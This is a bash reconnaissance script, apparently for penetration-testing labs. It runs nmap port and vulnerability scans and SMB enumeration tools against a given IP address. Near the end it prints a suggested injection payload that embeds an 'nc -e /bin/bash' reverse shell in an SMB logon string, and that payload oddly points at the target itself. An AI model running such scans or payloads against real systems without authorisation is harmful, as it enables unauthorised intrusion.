#!/usr/bin/bash

Y='\033[1;33m'
R='\033[0;31m'
NC='\033[0m' #No color

if [ "$#" = "1" ]; then
	mkdir nmap && mkdir smb_enum; clear
	printf "${Y}[+] Performing the default scan ${NC}\n\n"
	nmap -Pn -sC -sV -oN nmap/initial.nmap $1

	printf "\n${Y}[+] Performing an all port scan ${NC}\n\n"
	nmap -Pn -p1-65535 -oG nmap/allports.gnmap $1

	ports=$(grep -oP ' [\d]{1,6}/' nmap/allports.gnmap | sed 's/\///g' | tr '\n' ',')

	printf "\n${Y}[+] Performing a targetted port scan ${NC}\n\n"

	nmap -Pn -p"${ports}" -sC -sV -oN nmap/targetted.nmap $1

	printf "\n\n${Y}[+] Performing SMB enumeration with:${NC}"
	for i in ${ports};do
        if [[  $i == "445," ]]
        	then
        		printf "\n\n${Y}[+][+] smbclient ${NC}\n\n" 
			echo "" | smbclient -L \\$1 || echo "" | smbclient --port=139 -L \\$1 | tee smb_enum/smbclient.txt 
        		printf "\n\n${Y}[+][+] smbmap ${NC}\n\n"
			smbmap -H $1 || smbmap -P 139 -H $1 | tee smb_enum/smbmap.txt
			printf "\n\n${Y}[+][+] nbtscan ${NC}\n\n"
                        nbtscan $1 | tee smb_enum/nbtscan.txt 
			printf "\n\n${Y}[+][+] enum4linux ${NC}\n\n"
			enum4linux -a $1 | grep -P 'User\\' | tee smb_enum/enum4.txt
			cat smb_enum/*.txt >> smb_enum/initial.out
			rm smb_enum/*.txt
			printf "\n\n${Y}[+][+] Try the following on a writable share: logon \"./='nohup nc -e /bin/bash $1 9001'\" ${NC}\n\n"
        fi
	done

	printf "\n\n${Y}[+] Performing an all ports vuln detection scan ${NC}\n\n"
	nmap -Pn -p"${ports}" --script vuln -oN nmap/vuln.nmap $1

	printf "\n\n${Y}[+] Performing a UDP vuln scan ${NC}\n\n"
	nmap -Pn -vvv -sU -oN nmap/udp.nmap $1
else
	printf "${R}[+] Usage: ./initial.sh <IP-Address> ${NC}\n"
fi
